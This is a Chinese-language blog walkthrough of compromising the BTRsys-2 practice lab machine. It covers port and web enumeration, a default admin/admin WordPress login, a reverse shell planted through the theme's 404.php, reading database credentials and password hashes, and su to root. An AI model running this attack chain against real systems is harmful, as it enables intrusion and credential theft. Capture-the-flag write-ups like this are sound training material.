    <content type="html"><![CDATA[<h1 id="BTRsys-2-靶机"><a href="#BTRsys-2-靶机" class="headerlink" title="BTRsys-2 靶机"></a>BTRsys-2 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.153<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-18 01:26 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.153<br>Host is up (0.00062s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:96:CA:48 (VMware)<br></code></pre></td></tr></table></figure><p>开放了 21,22,80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p21,22,80 192.1.1.153           <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-18 01:27 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.153<br>Host is up (0.00035s latency).<br><br>PORT   STATE SERVICE VERSION                                                                                        <br>21/tcp open  ftp     vsftpd 3.0.3                                                                                   <br>| ftp-syst:                                                                                                         <br>|   STAT:                                                                                                           <br>| FTP server status:                                                                                                <br>|      Connected to ::ffff:192.1.1.128                                                                              <br>|      Logged <span class="hljs-keyword">in</span> as ftp                                                                                             <br>|      TYPE: ASCII                                                                                                  <br>|      No session bandwidth <span class="hljs-built_in">limit</span>                                                                                   <br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300                                                                            <br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 1<br>|      vsFTPd 3.0.3 - secure, fast, stable<br>|_End of status<br>|_ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 08:ee:e3:ff:31:20:87:6c:12:e7:1c:aa:c4:e7:54:f2 (RSA)<br>|   256 ad:e1:1c:7d:e7:86:76:be:9a:a8:bd:b9:68:92:77:87 (ECDSA)<br>|_  256 0c:e1:eb:06:0c:5c:b5:cc:1b:d1:fa:56:06:22:31:67 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">| http-robots.txt: 1 disallowed entry </span><br><span class="hljs-string">|_Hackers</span><br><span class="hljs-string">MAC Address: 00:0C:29:96:CA:48 (VMware)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 3.X|4.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="hljs-string">OS details: Linux 3.2 - 4.9</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></code></pre></td></tr></table></figure><p>发现了 robots.txt，允许 ftp 匿名登录，Ubuntu 操作系统。查看 ftp 中是否有敏感文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ ftp 192.1.1.153                                                                   <br>Connected to 192.1.1.153.<br>220 (vsFTPd 3.0.3)<br>Name (192.1.1.153:kali): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; binary<br>200 Switching to Binary mode.<br>ftp&gt; <span class="hljs-built_in">ls</span> -liah<br>229 Entering Extended Passive Mode (|||7107|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    2 0        118          4096 Mar 20  2017 .<br>drwxr-xr-x    2 0        118          4096 Mar 20  2017 ..<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">pwd</span><br>Remote directory: /<br>ftp&gt; exi<br>221 Goodbye.<br></code></pre></td></tr></table></figure><p>ftp 中空空如也</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>尝试目录爆破，同时访问 robots.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo dirsearch -u http://192.1.1.153/   <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Target: http://192.1.1.153/<br><br>[01:59:54] Starting: <br><br>[01:59:58] 200 -  224B  - /CHANGELOG                                        <br>[01:59:58] 200 -   34KB - /COPYING                                          <br>[01:59:58] 200 -    1KB - /INSTALL                                          <br>[01:59:59] 200 -    2KB - /LICENSE                                          <br>[01:59:59] 200 -  954B  - /README.md                                        <br>[02:00:12] 200 -   81B  - /index.html                                       <br>[02:00:13] 301 -  315B  - /javascript  -&gt;  http://192.1.1.153/javascript/   <br>[02:00:19] 200 -    1KB - /robots.txt                                       <br>[02:00:20] 403 -  299B  - /server-status                                    <br>[02:00:20] 403 -  300B  - /server-status/                                   <br>[02:00:23] 301 -  311B  - /upload  -&gt;  http://192.1.1.153/upload/           <br>[02:00:23] 500 -   67B  - /upload/                                          <br>[02:00:25] 200 -    2KB - /wordpress/wp-login.php                           <br>[02:00:25] 200 -    8KB - /wordpress/<br></code></pre></td></tr></table></figure><p>发现了 wordpress 路径，robots 中也是 wordpress 路径</p><p><img src="/pic/c39bdf0dba03ce013f31190ac91b7ff6_MD5.png"></p><h2 id="wpscan-收集信息"><a href="#wpscan-收集信息" class="headerlink" title="wpscan 收集信息"></a>wpscan 收集信息</h2><p>访问此目录发现页面渲染有点问题，不过问题不大，尝试 wpscan 来收集信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ wpscan --url http://btrisk.com/wordpress/ -e ap,u                                     <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | |_ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[+] URL: http://btrisk.com/wordpress/ [192.1.1.153]<br>[+] Started: Mon Sep 18 02:05:54 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://btrisk.com/wordpress/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://btrisk.com/wordpress/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://btrisk.com/wordpress/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://btrisk.com/wordpress/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 3.9.14 identified (Insecure, released on 2016-09-07).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://btrisk.com/wordpress/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;<br> |  - http://btrisk.com/wordpress/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=3.9.14&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentyfourteen<br> | Location: http://btrisk.com/wordpress/wp-content/themes/twentyfourteen/<br> | Latest Version: 3.6<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Style URL: http://btrisk.com/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | The version could not be determined.<br><br>[+] Enumerating All Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive and Aggressive Methods)<br><br>[i] Plugin(s) Identified:<br><br>[+] mail-masta<br> | Location: http://btrisk.com/wordpress/wp-content/plugins/mail-masta/<br> | Latest Version: 1.0 (up to <span class="hljs-built_in">date</span>)<br> | Last Updated: 2014-09-19T07:52:00.000Z<br> |<br> | Found By: Urls In Homepage (Passive Detection)<br> |<br> | Version: 1.0 (80% confidence)<br> | Found By: Readme - Stable Tag (Aggressive Detection)<br> |  - http://btrisk.com/wordpress/wp-content/plugins/mail-masta/readme.txt<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] btrisk<br> | Found By: Author Posts - Display Name (Passive Detection)<br> | Confirmed By:<br> |  Rss Generator (Passive Detection)<br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br><br>[+] admin<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure><p>尝试搜索插件漏洞</p><p><img src="/pic/169ed571f2dd2db5dc8ca64f97fe06ea_MD5.png"></p><p>发现本地文件包含漏洞是可以存在的，而 SQL 注入漏洞利用有点问题。</p><p><img src="/pic/e85ddf0921e180e498c6fcab5c177cb3_MD5.png"></p><p>虽然有这个漏洞，但是无法访问到配置文件</p><p><img src="/pic/1361b8cdbf6d678a60f45d92fe52a933_MD5.png"></p><h2 id="wordpress-爆破"><a href="#wordpress-爆破" class="headerlink" title="wordpress 爆破"></a>wordpress 爆破</h2><p>只能尝试一下爆破了，先试试 admin 账户</p><p><img src="/pic/281538fa01d89cd54295205a01c8d95f_MD5.png"></p><p>竟然成功了，用户名和密码都是 admin</p><p>编辑修改 404.php</p><p><img src="/pic/7f246bda2c8a5c33ddf92ba29b154810_MD5.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>提前开启监听，访问这个链接：<code>http://btrisk.com/wordpress/wp-content/themes/twentyfourteen/404.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443                    <br>listening on [any] 443 ...<br>connect to [192.1.1.128] from (UNKNOWN) [192.1.1.153] 48192<br>Linux ubuntu 4.4.0-62-generic <span class="hljs-comment">#83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br> 23:14:19 up 49 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.01, 0.13, 0.08<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:0c:29:96:ca:48 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.1.1.153/24 brd 192.1.1.255 scope global ens33</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::20c:29ff:fe96:ca48/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux ubuntu 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">$ which python3</span><br><span class="hljs-string">/usr/bin/python3</span><br><span class="hljs-string">$ python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@ubuntu:/$ sudo -l</span><br><span class="hljs-string">sudo -l</span><br><span class="hljs-string">[sudo] password for www-data:</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>反弹成功。看一看网站根目录，东西挺多的，优先看 wordpress 目录吧，毕竟里面有配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/var/www/html$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 2.1M<br> 13578 drwxrwxrwx  5 root   root 4.0K Apr 27  2017 .<br> 13577 drwxrwxrwx  5 root   root 4.0K May  2  2017 ..<br>    46 -rw-rw-r--  1 btrisk 1000 859K Apr 26  2017 1.gif<br> 14397 -rw-rw-r--  1 btrisk 1000 1.1M Apr 27  2017 2.gif<br> 14955 -rw-rw-r--  1 btrisk 1000  41K Apr 24  2017 Btrisk1.JPG<br> 14956 -rw-rw-r--  1 btrisk 1000  85K Apr 24  2017 Btrisk2.JPG<br> 14957 -rw-rw-r--  1 btrisk 1000  224 Oct 11  2016 CHANGELOG<br> 14958 -rw-rw-r--  1 btrisk 1000  35K Oct 11  2016 COPYING<br> 14960 -rw-rw-r--  1 btrisk 1000 1.3K Oct 11  2016 INSTALL<br> 14961 -rw-rw-r--  1 btrisk 1000 1.7K Oct 11  2016 LICENSE<br> 14962 -rw-rw-r--  1 btrisk 1000  954 Oct 11  2016 README.md<br>141029 drwxrwxr-x  2 btrisk 1000 4.0K Apr 24  2017 hsperfdata_tomcat6<br> 14959 -rw-rw-r--  1 btrisk 1000   81 Apr 27  2017 index.html<br> 14963 -rw-rw-r--  1 btrisk 1000 1.5K Apr 25  2017 robots.txt<br>141032 drwxrwxr-x 13 btrisk 1000 4.0K Apr 24  2017 upload<br> 16411 drwxrwxr-x  5 btrisk 1000 4.0K Apr 27  2017 wordpress<br><br>www-data@ubuntu:/var/www/html/wordpress$ <span class="hljs-built_in">cat</span> wp-config.php<br><span class="hljs-built_in">cat</span> wp-config.php<br>&lt;?php<br>/**<br> * The base configurations of the WordPress.<br> *<br> * This file has the following configurations: MySQL settings, Table Prefix,<br> * Secret Keys, WordPress Language, and ABSPATH. You can find more information<br> * by visiting &#123;@<span class="hljs-built_in">link</span> http://codex.wordpress.org/Editing_wp-config.php Editing<br> * wp-config.php&#125; Codex page. You can get the MySQL settings from your web host.<br> *<br> * This file is used by the wp-config.php creation script during the<br> * installation. You don\<span class="hljs-string">&#x27;t have to use the web site, you can just copy this file</span><br><span class="hljs-string"> * to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define(&#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>wordpress<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define(&#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>root<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define(&#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span>rootpassword!<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL hostname */</span><br><span class="hljs-string">define(&#x27;</span>DB_HOST<span class="hljs-string">&#x27;, &#x27;</span>localhost<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-string">define(&#x27;</span>DB_CHARSET<span class="hljs-string">&#x27;, &#x27;</span>utf8<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">www-data@ubuntu:/var/www/html/upload$ su</span><br><span class="hljs-string">su</span><br><span class="hljs-string">Password: rootpassword!</span><br><span class="hljs-string"></span><br><span class="hljs-string">su: Authentication failure</span><br></code></pre></td></tr></table></figure><p>发现了数据库的密码，尝试 su 直接切换用户，但是密码不正确</p><h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><p>进入数据库看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/var/www/html/upload$ mysql -uroot -p<br>mysql -uroot -p<br>Enter password: rootpassword!<br><br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection <span class="hljs-built_in">id</span> is 3488<br>Server version: 5.7.17-0ubuntu0.16.04.1 (Ubuntu)<br><br>Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>mysql&gt; show databases;<br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| deneme             |<br>| mysql              |<br>| performance_schema |<br>| phpmyadmin         |<br>| sys                |<br>| wordpress          |<br>+--------------------+<br>7 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><p>deneme 中为空，那就只能看 wordpress 了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; use wordpress<br>use wordpress<br>Reading table information <span class="hljs-keyword">for</span> completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><br>mysql&gt; <span class="hljs-keyword">select</span> * from wp_users<br><span class="hljs-keyword">select</span> * from wp_users<br>    -&gt; ;<br>;<br>+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+<br>| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |<br>+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+<br>|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk        | mdemir@btrisk.com |          | 2017-04-24 17:37:04 |                     |           0 | btrisk       |<br>|  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin         | ikaya@btrisk.com  |          | 2017-04-24 17:37:04 |                     |           4 | admin        |<br>+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+<br>2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt; <span class="hljs-built_in">exit</span><br><span class="hljs-built_in">exit</span><br>Bye<br></code></pre></td></tr></table></figure><p>发现了另一个用户名和其密码哈希</p><p><img src="/pic/2e8c0697b1645437b73aecc7db328564_MD5.png"></p><h3 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h3><p>尝试直接切换为root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/var/www/html$ su<br>su<br>Password: roottoor<br><br>root@ubuntu:/var/www/html<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@ubuntu:~<span class="hljs-comment"># 